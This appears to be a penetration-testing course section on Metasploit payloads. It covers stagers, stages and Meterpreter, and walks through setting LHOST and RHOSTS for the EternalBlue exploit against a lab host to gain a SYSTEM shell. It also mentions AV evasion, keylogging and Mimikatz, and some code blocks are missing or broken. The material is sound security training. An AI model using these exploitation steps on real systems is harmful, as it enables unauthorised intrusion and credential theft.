# Payloads

A `Payload` in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker. The payloads are sent together with the exploit itself to bypass standard functioning procedures of the vulnerable service (`exploits job`) and then run on the target OS to typically return a reverse connection to the attacker and establish a foothold (`payload's job`).

There are three different types of payload modules in the Metasploit Framework: Singles, Stagers, and Stages. Using three typologies of payload interaction will prove beneficial to the pentester. It can offer the flexibility we need to perform certain types of tasks. Whether or not a payload is staged is represented by `/` in the payload name.

For example, `windows/shell_bind_tcp` is a single payload with no stage, whereas `windows/shell/bind_tcp` consists of a stager (`bind_tcp`) and a stage (`shell`).

**Singles**

A `Single` payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. However, some exploits will not support the resulting size of these payloads as they can get quite large. `Singles` are self-contained payloads. They are the sole object sent and executed on the target system, getting us a result immediately after running. A Single payload can be as simple as adding a user to the target system or booting up a process.

**Stagers**

`Stager` payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. `Stagers` are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable. Metasploit will use the best one and fall back to a less-preferred one when necessary.

Windows NX vs. NO-NX Stagers

* Reliability issue for NX CPUs and DEP
* NX stagers are bigger (VirtualAlloc memory)
* Default is now NX + Win7 compatible

**Stages**

`Stages` are payload components that are downloaded by stager's modules. The various payload Stages provide advanced features with no size limits, such as Meterpreter, VNC Injection, and others. Payload stages automatically use middle stagers:

* A single `recv()` fails with large payloads
* The Stager receives the middle stager
* The middle Stager then performs a full download
* Also better for RWX

***

### Staged Payloads

A staged payload is, simply put, an `exploitation process` that is modularized and functionally separated to help segregate the different functions it accomplishes into different code blocks, each completing its objective individually but working on chaining the attack together. This will ultimately grant an attacker remote access to the target machine if all the stages work correctly.

The scope of this payload, as with any others, besides granting shell access to the target system, is to be as compact and inconspicuous as possible to aid with the Antivirus (`AV`) / Intrusion Prevention System (`IPS`) evasion as much as possible.

`Stage0` of a staged payload represents the initial shellcode sent over the network to the target machine's vulnerable service, which has the sole purpose of initializing a connection back to the attacker machine. This is what is known as a reverse connection. As a Metasploit user, we will meet these under the common names `reverse_tcp`, `reverse_https`, and `bind_tcp`. For example, under the `show payloads` command, you can look for the payloads that look like the following:

Reverse connections are less likely to trigger prevention systems like the one initializing the connection is the victim host, which most of the time resides in what is known as a `security trust zone`. However, of course, this trust policy is not blindly followed by the security devices and personnel of a network, so the attacker must tread carefully even with this step.

Stage0 code also aims to read a larger, subsequent payload into memory once it arrives. After the stable communication channel is established between the attacker and the victim, the attacker machine will most likely send an even bigger payload stage which should grant them shell access. This larger payload would be the `Stage1` payload. We will go into more detail in the later sections.

**Meterpreter Payload**

The `Meterpreter` payload is a specific type of multi-faceted payload that uses `DLL injection` to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes. Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques. In addition, scripts and plugins can be `loaded and unloaded` dynamically as required.

Once the Meterpreter payload is executed, a new session is created, which spawns up the Meterpreter interface. It is very similar to the msfconsole interface, but all available commands are aimed at the target system, which the payload has "infected." It offers us a plethora of useful commands, varying from keystroke capture, password hash collection, microphone tapping, and screenshotting to impersonating process security tokens. We will delve into more detail about Meterpreter in a later section.

Using Meterpreter, we can also `load` in different Plugins to assist us with our assessment. We will talk more about these in the Plugins section of this module.

### Searching for Payloads

To select our first payload, we need to know what we want to do on the target machine. For example, if we are going for access persistence, we will probably want to select a Meterpreter payload.

As mentioned above, Meterpreter payloads offer us a significant amount of flexibility. Their base functionality is already vast and influential. We can automate and quickly deliver combined with plugins such as [GentilKiwi's Mimikatz Plugin](https://github.com/gentilkiwi/mimikatz) parts of the pentest while keeping an organized, time-effective assessment. To see all of the available payloads, use the `show payloads` command in `msfconsole`.

```

As seen above, there are a lot of available payloads to choose from. Not only that, but we can create our payloads using `msfvenom`, but we will dive into that a little bit later. We will use the same target as before, and instead of using the default payload, which is a simple `reverse_tcp_shell`, we will be using a `Meterpreter Payload for Windows 7(x64)`.

Scrolling through the list above, we find the section containing `Meterpreter Payloads for Windows(x64)`.

```

As we can see, it can be pretty time-consuming to find the desired payload with such an extensive list. We can also use `grep` in `msfconsole` to filter out specific terms. This would speed up the search and, therefore, our selection.

We have to enter the `grep` command with the corresponding parameter at the beginning and then the command in which the filtering should happen. For example, let us assume that we want to have a `TCP` based `reverse shell` handled by `Meterpreter` for our exploit. Accordingly, we can first search for all results that contain the word `Meterpreter` in the payloads.

With the help of `grep`, we reduced the list of payloads we wanted down to fewer. Of course, the `grep` command can be used for all other commands. All we need to know is what we are looking for.

### Selecting Payloads

Same as with the module, we need the index number of the entry we would like to use. To set the payload for the currently selected module, we use `set payload <no.>` only after selecting an Exploit module to begin with.

As we can see, by running the `show payloads` command within the Exploit module itself, msfconsole has detected that the target is a Windows machine, and such only displayed the payloads aimed at Windows operating systems.

We can also see that a new option field has appeared, directly related to what the payload parameters will contain. We will be focusing on `LHOST` and `LPORT` (our attacker IP and the desired port for reverse connection initialization). Of course, if the attack fails, we can always use a different port and relaunch the attack.

***

### Using Payloads

Time to set our parameters for both the Exploit module and the payload module. For the Exploit part, we will need to set the following:

| **Parameter** | **Description**                                                                        |
| ------------- | -------------------------------------------------------------------------------------- |
| `RHOSTS`      | The IP address of the remote host, the target machine.                                 |
| `RPORT`       | Does not require a change, just a check that we are on port 445, where SMB is running. |

For the payload part, we will need to set the following:

| **Parameter** | **Description**                                                              |
| ------------- | ---------------------------------------------------------------------------- |
| `LHOST`       | The host's IP address, the attacker's machine.                               |
| `LPORT`       | Does not require a change, just a check that the port is not already in use. |

If we want to check our LHOST IP address quickly, we can always call the `ifconfig` command directly from the msfconsole menu.

**MSF - Exploit and Payload Configuration**

Payloads

```shell-session

msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15

LHOST => 10.10.14.15


msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40
```

Then, we can run the exploit and see what it returns. Check out the differences in the output below:

meterpreter > whoami

[-] Unknown command: whoami.


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

The prompt is not a Windows command-line one but a `Meterpreter` prompt. The `whoami` command, typically used for Windows, does not work here. Instead, we can use the Linux equivalent of `getuid`. Exploring the `help` menu gives us further insight into what Meterpreter payloads are capable of.

`Channel 1` has been created, and we are automatically placed into the CLI for this machine. The channel here represents the connection between our device and the target host, which has been established in a reverse TCP connection (from the target host to us) using a Meterpreter Stager and Stage. The stager was activated on our machine to await a connection request initialized by the Stage payload on the target machine.

Moving into a standard shell on the target is helpful in some cases, but Meterpreter can also navigate and perform actions on the victim machine. So we see that the commands have changed, but we have the same privilege level within the system.

Let's see what other types of payloads we can use. We will be looking at the most common ones related to Windows operating systems.

***

### Payload Types

The table below contains the most common payloads used for Windows machines and their respective descriptions.

| **Payload**                       | **Description**                                                        |

| `generic/shell_bind_tcp`          | Generic listener, multi-use, normal shell, TCP connection binding      |
| `generic/shell_reverse_tcp`       | Generic listener, multi-use, normal shell, reverse TCP connection      |
| `windows/x64/exec`                | Executes an arbitrary command (Windows x64)                            |
| `windows/x64/loadlibrary`         | Loads an arbitrary x64 library path                                    |
| `windows/x64/messagebox`          | Spawns a dialog via MessageBox using a customizable title, text & icon |
| `windows/x64/shell_reverse_tcp`   | Normal shell, single payload, reverse TCP connection                   |
| `windows/x64/shell/reverse_tcp`   | Normal shell, stager + stage, reverse TCP connection                   |
| `windows/x64/shell/bind_ipv6_tcp` | Normal shell, stager + stage, IPv6 Bind TCP stager                     |
| `windows/x64/meterpreter/$`       | Meterpreter payload + varieties above                                  |
| `windows/x64/powershell/$`        | Interactive PowerShell sessions + varieties above                      |
| `windows/x64/vncinject/$`         | VNC Server (Reflective Injection) + varieties above                    |

Other critical payloads that are heavily used by penetration testers during security assessments are Empire and Cobalt Strike payloads. These are not in the scope of this course, but feel free to research them in our free time as they can provide a significant amount of insight into how professional penetration testers perform their assessments on high-value targets.

Besides these, of course, there are a plethora of other payloads out there. Some are for specific device vendors, such as Cisco, Apple, or PLCs. Some we can generate ourselves using `msfvenom`. However, next up, we will look at `Encoders` and how they can be used to influence the attack outcome.
